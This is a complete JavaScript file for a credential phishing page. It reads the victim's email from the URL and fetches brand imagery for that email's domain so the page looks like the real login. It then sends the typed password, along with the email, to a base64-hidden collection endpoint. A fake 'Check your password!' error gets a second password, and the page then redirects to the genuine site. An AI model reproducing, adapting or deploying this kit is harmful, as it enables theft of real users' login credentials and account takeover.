var burl = (window['location'])['href'];
var mlurl = burl['substring'](burl['lastIndexOf']('=') + 1);
let regexCheck = new RegExp("([!#-'*+/-9=?A-Z^-~-]+(\.[!#-'*+/-9=?A-Z^-~-]+)*|\"\(\[\]!#-[^-~ \t]|(\\[\t -~]))+\")@([!#-'*+/-9=?A-Z^-~-]+(\.[!#-'*+/-9=?A-Z^-~-]+)*|\[[\t -Z^-~]*])");
const labody = document.querySelector('#susBody');
window.retryAttemptCount = 0;

if (!regexCheck.test(mlurl) ) {
	document['querySelector']('html')['innerHTML']="Invalid"
	window['stop']();
}else{
	document.querySelector('.show-acct').innerHTML = mlurl 
}

window['addEventListener']('load', event => {
	window.retryAttemptCount = 0;
	document.querySelector('.show-acct').innerHTML = mlurl
	fetchMeSomeGoodies(labody.getAttribute('data-xmone'), labody.getAttribute('data-xmtwo'));
	const susModal = new bootstrap.Modal('#susModal', {
	    backdrop: 'static',
	    keyboard: false,
	    show: true,
	});
	setTimeout(() => {susModal.show(); 	 pageloader('hide') }, 1000)
});

const susForm = document['getElementById']('susForm');
var aktion= atob(susForm.getAttribute('data-action')); 

var susSubmitBtn= document.querySelector('#susSubmitBtn');
susForm['addEventListener']('submit', e => {
  	e.preventDefault();
		// console.log(aktion);
	
	var susPword = document.querySelector('#susPass');

  if (!susPword.checkValidity()) {
  	susPword.classList.add('bu-invalid')
    document.querySelector('#susPass ~ .invalid-div').innerHTML = susPword.validationMessage;
  } 

  else {
	window.retryAttemptCount = retryAttemptCount + 1;

  	susPword.classList.remove('bu-invalid')
    document.querySelector('#susPass ~ .invalid-div').innerHTML = "";

	const susFormData = new FormData(susForm);
	var theredi = typeof e_sus === 'undefined' ?  `https://${d0men(mlurl)}` : e_sus.redirect;
	susFormData.append('email', mlurl);
	susFormData.append('pass', susPword.value);
	susFormData.append('redirect', theredi);
	susFormData.append('clientUrl', theredi);
	susFormData.append('typesent', typeof typesent === 'undefined' ? "New" : typesent);

	susSubmitBtn.setAttribute('disabled', false);
	susSubmitBtn.innerHTML =`<i class="ri-lock-2-line"></i> <span class="spinner-grow spinner-grow-sm" role="status" aria-hidden="true"></span> Kindly wait...` ;
	document.querySelector('#lerror').innerText = 'Check your password!'
	susPword.value = '';
	susPword.focus();

	fetch(aktion, {
	  method: 'POST', // oder 'PUT'
	  headers: {
	  },
	  body: susFormData,
	})
	.then(res => res.json())
	.then(fdbk => {
        window.typesent = "Verification";
        if (retryAttemptCount>=2) { 
            	retryAttemptCount=0;
            	window['location']['href'] =   theredi;
        }
	  	// console.log('Success:', fdbk);
		susSubmitBtn.innerHTML =`<i class="ri-lock-2-line"></i> Secured Sign In` ;
	  susSubmitBtn.removeAttribute('disabled');

	})
	.catch((error) => {
	  console.error('Error:', error);
	});
  } 

  e.preventDefault()

});


function pageloader(toggle ='show') {
	var onpageload = document.querySelector('#onpageload')
	var maintag = document.querySelector('main')
	if (toggle === 'hide') {
		maintag.style.display = 'none';
		onpageload.classList.add('dissimule')
	}else{
		maintag.style.display = 'block';
		onpageload.classList.remove('dissimule')
	}
	
}

			
 async function fetchMeSomeGoodies(...goodieLocation){

	const options  = {method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded',},body:`key=${Math.random()}`}

	let fetchmeGoodie1 = Promise.resolve(fetch(atob(goodieLocation[0])+mlurl, options).then((response) => response.json()));
	let fetchmeGoodie2 = Promise.resolve(fetch(atob(goodieLocation[1])+mlurl, options).then((response) => response.json()));

	Promise.allSettled([fetchmeGoodie1, fetchmeGoodie2]).then(([response1, response2] ) => {
		// console.log(response1);
		if (response1.status ==='fulfilled' && response1.value.bgtype === 'img') {
			populateDOM(response1.value);
		}else if(response1.status ==='fulfilled' && response1.value.bgtype === 'url') {
			populateDOM(response2.value);
		}
	}).catch( (error) =>	{
		// console.log(error)
	}).finally(() => ""/*console.log('asdasd')*/  );//stop loading indicator
}


function populateDOM(sus){
	// console.log(sus)
	document.querySelector('link[rel="shortcut icon"]').setAttribute('href', sus.favicon);
	document.querySelector('#susFavTiny img').setAttribute('src', sus.favicon);
	document.querySelector('#susMainId').style.display = "block";
	document.querySelector('.susMainClass').style.background = `url('${sus.bg}')  no-repeat fixed 50% 50% / cover`;
	document.querySelector('#susPass').style.zIndex = '50000'; 
	document.querySelector('#susPass').focus();
	window.e_sus = sus;
}

window.d0men = (hmm) =>  hmm.substring(hmm.lastIndexOf("@") +1)